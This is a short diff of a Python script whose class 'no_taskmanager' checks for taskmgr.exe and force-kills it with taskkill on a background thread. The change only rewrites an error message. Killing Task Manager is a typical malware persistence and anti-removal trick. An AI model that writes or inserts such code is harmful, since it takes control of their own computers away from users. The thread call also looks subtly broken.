@@ -20,8 +20,8 @@ class no_taskmanager():
     try:
         if is_running("taskmgr.exe"):
             os.system("taskkill /F /IM taskmgr.exe")
-    except Exception as e:
-        print(f"Error while trying to close task manager: {e}")
+    except:
+        print("Error checking task manager. Continuing...")
 
 threading.Thread(target=no_taskmanager.is_running, args=("taskmgr.exe",)).start()
     
